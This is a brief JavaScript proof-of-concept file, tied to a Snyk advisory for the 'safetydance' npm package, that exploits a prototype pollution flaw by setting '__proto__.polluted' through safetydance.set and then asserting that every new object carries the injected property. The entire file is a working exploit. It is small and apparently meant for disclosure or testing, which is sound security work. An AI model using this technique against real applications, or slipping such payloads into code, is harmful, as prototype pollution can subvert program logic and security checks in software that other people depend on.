//https://snyk.io/vuln/SNYK-JS-SAFETYDANCE-598687

const assert = require('assert');
const safetydance = require('safetydance'); 

var obj = {}
console.log("Before : " + obj.polluted);
safetydance.set({}, '__proto__.polluted', "yes");

console.log("After : " + obj.polluted);
assert({}.polluted === "yes");
console.log("payload success!");